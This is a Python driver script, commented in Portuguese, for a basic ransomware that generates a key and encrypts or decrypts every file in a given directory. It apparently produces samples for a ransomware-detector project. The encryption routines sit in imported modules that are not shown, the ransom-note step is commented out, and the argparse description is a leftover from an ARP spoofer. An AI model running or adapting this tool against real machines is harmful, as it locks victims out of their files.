import os
from os import path
from time import sleep
import modules.encrypter as encrypter
import modules.decrypter as decrypter
import modules.key_generator as key_generator
import argparse
import logging

# Caminho teste para criptografar/descriptografar
# python basicaransomware.py -p "/home/matheusheidemann/Documents/Python Files/Python-Ransomware-Detector/ransomware-samples/encrypt-test"

def getArguments():
    parser = argparse.ArgumentParser(description="PYTHON ARP SPOOFER - Script to spoof to targets in the same network")
    parser.add_argument("-p", "--path", action="store", help="O caminho para criptografar/descriptografar os arquivos")
    parser.add_argument("-e", "--encrypt", action="store_true", help="O caminho para criptografar/descriptografar os arquivos")
    parser.add_argument("-d", "--decrypt", action="store_true", help="O caminho para criptografar/descriptografar os arquivos")
    args = parser.parse_args()

    # Checar se o usuário passou --encrypt e --decrypt ao mesmo tempo
    if args.encrypt and args.decrypt:
        print("ERRO - Você passou o argumento --encrypt e --decrypt! Por favor, use apenas um dos dois!")
        print("Finzalizando...")
        quit()
    
    # Checar se o usuário não passou --encrypt ou --decrypt
    if not args.encrypt and not args.decrypt:
        print("ERRO - Você não passou o argumento --encrypt ou --decrypt! Por favor, define qual a operação que será realizada!")
        print("Finzalizando...")
        quit()

    # Checar se o usuário passou o caminho para criptografar/descriptografar
    if args.path:
        if not os.path.exists(args.path):
            print("ERRO! O caminho fornecido não existe!")
            print("Finzalizando...")
            quit()
    else:
        print(f"ERRO! Você precisa fornecer um caminho para {'criptografar' if args.encrypt else 'descriptografar'}!")
        print("Finzalizando...")
        quit()
    
    # Retornar os argumentos
    return args


if __name__ == '__main__':
    # Pegar os argumentos
    args = getArguments()

    # Colocar o diretório pai em uma variável
    directory = args.path 
    # Listar arquivos no diretório definido (retorna uma lista com cada nome de arquivo)
    items = os.listdir(directory)
    # Caminho completo para criptografar/descriptografar + cada nome de arquivo
    # O "full_path" é uma lista que conterá os items "path + cada item da lista 'items'")
    full_path = [directory + '/' + item for item in items]

    # Criptografar ou Descriptografar os arquivos
    # Criptografar
    if args.encrypt:
        # Gerar a chave de criptografia
        key_generator.generateKey()
        # Carregar a chave de criptografia
        key = key_generator.loadKey()
        # Criptografar os arquivos
        encrypter.run(directory, full_path, key)
        # Criar um arquivo informando como descriptografar os arquivos
        # encrypter.createDecryptTxt(directory)
    # Descriptografar
    elif args.decrypt:
        # Carregar a chave de criptografia
        key = key_generator.loadKey()
        # Descriptografar os arquivos
        decrypter.run(directory, full_path, key)
        # Deletar o arquivo informando como descriptografar os arquivos
        # decrypter.deleteDecryptTxt(directory)
